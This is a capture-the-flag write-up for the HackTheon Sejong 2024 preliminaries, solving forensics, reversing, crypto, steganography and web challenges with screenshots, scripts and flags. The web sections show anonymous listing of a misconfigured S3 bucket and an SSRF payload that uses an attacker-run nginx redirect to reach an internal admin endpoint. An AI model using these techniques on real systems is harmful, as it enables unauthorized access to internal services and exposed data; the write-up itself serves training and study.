# HackTheon Sejong 2024 Preliminaries

## Rumor 1

Find the ip using Regular Expression
```re=
(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$
```

Also, we can find thunderbird.exe this mail application by applying smtp search filter.

![image](https://hackmd.io/_uploads/Sy1cQH5bR.png)

Mail Server IP: `92.68.200.206`

### Flag
`92.68.200.206`

### Real Flag

## Rumor 2

![image](https://hackmd.io/_uploads/rys8VS5-A.png)

![image](https://hackmd.io/_uploads/HykDVB5WA.png)

### Flag
`3868`

### Real Flag
`HTO{d6aa2d79b0904d8a8c805e8ce061deb5}`

## Rumor 3

run by <ping -n 192.168.100.xxx...> and by the parent process command \<python netscan.py>

![image](https://hackmd.io/_uploads/rJIAiIq-C.png)

### Flag
`192.168.100.0/24`

### Real Flag
`HTO{05d8078dd8dc40aeadbdc52858072461}`

## Revact
![題目](https://hackmd.io/_uploads/rkvcueqWR.png)

![1](https://hackmd.io/_uploads/H1Koulc-R.png)

![wrong](https://hackmd.io/_uploads/r122_xcbR.png)

We can see [js](https://d1rov3aw0q2u2y.cloudfront.net/static/js/main.5e39c7c2.js) code here.

Let't use this [deobfuscator js tool](https://js-deobfuscator.vercel.app/) to deobfuscate

Read line 12093
![image](https://hackmd.io/_uploads/BkACGB5ZA.png)

At line 12094 is a function for wrong
At line 12099 is a function for correct

Check line 12111 is onClick. 

![image](https://hackmd.io/_uploads/ByvuXScbR.png)

It will check flag is start and end with 'X' char

Read line 12170.

![image](https://hackmd.io/_uploads/SyK4NScbC.png)

It will check all flag without first and least char.

So 

``` javascript
e[5].charCodeAt() - 56 === e[1].charCodeAt() - 5
e[2] === e[3]
"@" === e[2]
e[4] === "D"
e[5].charCodeAt() === e[4].charCodeAt() + 54
```

We can get `G@@Dz`

And start and end with 'X' we can get: `XG@@DzX`

### Flag
`XG@@DzX`

![correct](https://hackmd.io/_uploads/B15Tdl9-C.png)

### Real Flag
`HTO{a7f7e4ab0a35471fa8c93c9ae63a4dcf}`

## DogGallery
![image](https://hackmd.io/_uploads/B1NxFx5bR.png)

There is a web site with dog gallery.

![image](https://hackmd.io/_uploads/S1JctgqZA.png)

Try get photo url.

![image](https://hackmd.io/_uploads/SJeotx9-C.png)

It is s3.

Try list.

``` bash
$ aws s3 ls htodogpics --no-sign-request
2024-03-27 16:53:07      35201 KakaoTalk_20240322_225011458.jpg
2024-03-27 16:53:07      63496 KakaoTalk_20240322_225011458_01.jpg
2024-03-27 16:53:08      18788 KakaoTalk_20240322_225011458_02.jpg
2024-03-27 16:53:08      79530 KakaoTalk_20240322_225011458_03.jpg
2024-03-27 16:53:09     101359 KakaoTalk_20240322_225011458_04.jpg
2024-03-27 16:53:09      89889 KakaoTalk_20240322_225011458_05.jpg
2024-03-27 16:53:09     101009 KakaoTalk_20240322_225011458_06.jpg
2024-03-27 16:53:09      52563 KakaoTalk_20240322_225011458_07.jpg
2024-03-27 16:53:10     180610 KakaoTalk_20240322_225011458_08.jpg
2024-03-27 16:53:10     120779 KakaoTalk_20240322_225011458_09.jpg
2024-03-27 16:53:11     116943 KakaoTalk_20240322_225011458_10.jpg
2024-03-27 16:53:11      62929 KakaoTalk_20240322_225011458_11.jpg
2024-03-27 16:53:11      86928 KakaoTalk_20240322_225011458_12.jpg
2024-03-27 16:53:12     135391 KakaoTalk_20240322_225011458_13.jpg
2024-03-27 16:53:12     135960 KakaoTalk_20240322_225011458_14.jpg
2024-03-27 16:53:01     102581 KakaoTalk_20240322_225011458_15.jpg
2024-03-27 16:53:01      48535 KakaoTalk_20240322_225011458_16.jpg
2024-03-27 16:53:01      41072 KakaoTalk_20240322_225011458_17.jpg
2024-03-27 16:53:02     102591 KakaoTalk_20240322_225011458_18.jpg
2024-03-27 16:53:02     143313 KakaoTalk_20240322_225011458_19.jpg
2024-03-27 16:53:03     100793 KakaoTalk_20240322_225011458_20.jpg
2024-03-27 16:53:03      79099 KakaoTalk_20240322_225011458_21.jpg
2024-03-27 16:53:04     179323 KakaoTalk_20240322_225011458_22.jpg
2024-03-27 16:53:05      62237 KakaoTalk_20240322_225209463.jpg
2024-03-27 16:53:05      92706 KakaoTalk_20240322_225209463_01.jpg
2024-03-27 16:53:05      88516 KakaoTalk_20240322_225209463_02.jpg
2024-03-27 16:53:06      76522 KakaoTalk_20240322_225209463_03.jpg
2024-03-27 16:53:06     101761 KakaoTalk_20240322_225209463_04.jpg
2024-03-27 16:53:06      69273 KakaoTalk_20240322_225209463_05.jpg
2024-03-27 16:53:07      84016 KakaoTalk_20240322_225209463_06.jpg
2024-03-27 16:57:43        239 OMG_SUPER_S3CR3T_PR0TECTED_F1LE.txt
2024-04-12 03:07:48         42 index.html
2024-03-27 17:01:36         69 robots.txt
```

read OMG_SUPER_S3CR3T_PR0TECTED_F1LE.txt

```
Oh no! It looks like I made a mistake in configuring the S3 bucket policy, which means that all objects are now visible! This is a big problem, as it means that all of our important files are also exposed.

FLAG : IMPORTANT_S3_P0L1CY_ByJ
```

### Flag
`IMPORTANT_S3_P0L1CY_ByJ`

### Real flag
`HTO{2828ec41891f40c69b054db9848fd01b}`


## GithubReadme
![image](https://hackmd.io/_uploads/H1iIVX9bA.png)

A web site to get github readme.

![image](https://hackmd.io/_uploads/HJAbB75-C.png)

Check source code.

![image](https://hackmd.io/_uploads/Bk9XB79WC.png)

There can url injection to SSRF.

Try this payload to get google.

```bash
curl -X POST "https://githubreadme.hacktheon-ctf.org/api/view" -d '{"path":"@www.google.com?test=","branch_name":"main"}'
```

![image](https://hackmd.io/_uploads/S1ypHmq-R.png)

success!!

But we need to redirect to http.

Build a nginx server with https to redirect http.

```
server {
    listen [::]:443 ssl; # managed by Certbot
    listen 443 ssl; # managed by Certbot
    ssl_certificate /etc/letsencrypt/live/test.chummydns.com/fullchain.pem; # managed by Certbot
    ssl_certificate_key /etc/letsencrypt/live/test.chummydns.com/privkey.pem; # managed by Certbot
    include /etc/letsencrypt/options-ssl-nginx.conf; # managed by Certbot
    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem; # managed by Certbot
    server_name test.chummydns.com;
    return 301 http://localhost:8044/api/admin;
}
```

And try this payload

```bash
curl -X POST "https://githubreadme.hacktheon-ctf.org/api/view" -d '{"path":"@test.chummydns.com?test=","branch_name":"main"}'
```

Get flag!!

![image](https://hackmd.io/_uploads/SkqR47qZ0.png)

### Flag
`J_DN5_S5L_CUST0M_JH`


### Real flag
`HTO{e1a2f6b23d054376be71414973f3d9b5}`

## Decrypt Message 1

The encryption function in the source code split each chunk of data into four parts, each part contains a single byte of the data chunk. After processing through a series of bitwise operations, the function returns the output as the final encrypted data. The whole process can be summarized as the following pseudo code:

```clike
((((chunk + 0xB) * (chunk + 0x11)) ^ ((chunk + 0xB) * (chunk + 0x11) >> 8)) >> 0x10) ^ 
    ((chunk + 0xB) * (chunk + 0x11) >> 8) ^ ((chunk + 0xB) * (chunk + 0x11))
```
By reversing the xor operation and solving a quadratic equation, we can recover the original data chunk. We use the following script to obtain the flag:
```python 
import math

enc = bytes.fromhex("188d1f2f13cd5b601bd6047f04496ff704496ff704496ff7")

print(list(enc))

result = b""

sol = lambda a: (-28 + math.sqrt(28**2-4*(187-a))) / 2

for i in range(0, len(enc), 4):
    tmp = enc[i] << 0x18
    tmp += (enc[i+1] ^ enc[i]) << 0x10
    tmp += (enc[i+2] ^ enc[i+1]) << 0x8
    tmp += (enc[i+3] ^ enc[i+2])
    print(sol(tmp))
    result += int.to_bytes(int(sol(tmp)), length=2, byteorder="big")

flag = b"".join([result[i:i+2][::-1] for i in range(0, len(result), 2)])
print(flag)
```

### Flag
`GODGPT!!!!!!`
### Real Flag


## Decrypt Message 2

According to the decompile result, the flag is encrypted by applying bitwise xor  to every chunck of the flag with a random generated key. The key is sorted in ascending order beforehand and each chunk of the flag is also sorted likewise with the same order. Since the question provides the first 5 character of the flag, we can brute force through every possible order with serveral constraints. For instance, the flag should only contains alphabets and numbers and the sequence must be in a ascending order. Based on the above, we can write the script accordingly.

First obtain the key for encryption and the order of it.
```python=
from itertools import permutations

enc = [0x44, 0x67, 0x09, 0x21, 0x35, 0x50, 0x02, 0x0f, 0x3b, 0x28, 0x69, 0x65,
 0x33, 0x18, 0x32, 0x06, 0x63, 0x1e, 0x03, 0x07, 0x43, 0x39, 0x4d, 0x45, 0x31]

hint = "BrU7e"

for com in list(permutations(hint, len(hint))):
    prev = -1
    seq = []
    key = ""
    is_valid = True
    for ie, e in enumerate(enc[0:5]):
        r = e ^ ord(com[ie])
        if r > prev and ((r >= 0x30 and r <= 0x39) or (r >= 0x41 and r <= 0x5A) or (r >= 0x61 and r <= 0x7A)) :
            seq.append(r)
            prev = r
        else:
            is_valid = False
            break
    if not is_valid:
        continue
    print(com)
    print(seq)
    for s in seq:
        print(chr(s), end="")
```

With this output

```
('r', '7', 'e', 'U', 'B')
[54, 80, 108, 116, 119]
6Pltw
```

we can write the following snipet of code to recover the actual flag.

``` python=
dec = ""
for i in range(0, len(enc), 5):
    tmp = ""
    for ik, k in enumerate("6Pltw"):
        tmp += chr(enc[i+ik] ^ ord(k))
    dec += f"{tmp[4]}{tmp[0]}{tmp[3]}{tmp[1]}{tmp[2]}"
print(dec)
```

### Flag
`BrU7e_fORcE_l5_p0w3rFu1i!`

### Real Flag

## PNG

Because of The head of sky.png missing, the png cannot properly opened.

![image](https://hackmd.io/_uploads/BkVv-wcbC.png)

After we fixed it, we can get the flag (show on the screenshot below)

![螢幕擷取畫面 2024-04-27 193220 (2)](https://hackmd.io/_uploads/ry6zQwq-C.png)

### Flag

`s1gnatur35_Are_v3ry_1mp0rtant_1n_th3_5srutur3_offil3s`

### Real Flag
`HTO{0ad6a5cb8db94724808b950026533a7c}`

## MS

Examine the work sheet file in HxD, we can observe that the file contains text that may suggest this is a Microsoft PowerPoint file .ppt/.pptx. 

![image](https://hackmd.io/_uploads/Hyay2U9-R.png)

By changing the extesion to .ppt we can get the flag in it.
![image](https://hackmd.io/_uploads/SkAQnUcb0.png)

### Flag
`th15_1s_00XML`

### Real Flag


## confidentail

First use strings to search some information, PDF will contain some file instrucuter so I usually set minium length as 20.

![image](https://hackmd.io/_uploads/BJ95aci-C.png)

After strings , there is a suspicious string append after JS, so use python to decode hex, then see a javascript code. 

![image](https://hackmd.io/_uploads/rkYo6cibC.png)

After read the source we know to use base64 decode and the compress data contained some word subfiles, so write into a .word file and open it.

![image](https://hackmd.io/_uploads/rkG6TcjWR.png)

![image](https://hackmd.io/_uploads/B1uTa5jbA.png)

### Flag

`I_cant_b3li3v3_y0u_put_a_fil3_1n_a_PDF`

## stegoArt

Use some common stego command to dig informatoins, and see some coordinates in zsteg `b1,g,lsb,xy`

![image](https://hackmd.io/_uploads/B1vbAcoZ0.png)

Use `-E` extract and write a script to map these point to a png
`zsteg -E b1,g,lsb,xy > output.txt`

![image](https://hackmd.io/_uploads/Sk2B09obA.png)

### Flag
I_LOVE_XY

## Backtest
Tradeview
![image](https://hackmd.io/_uploads/BJOsVpvzR.png)

### Flag 
來不及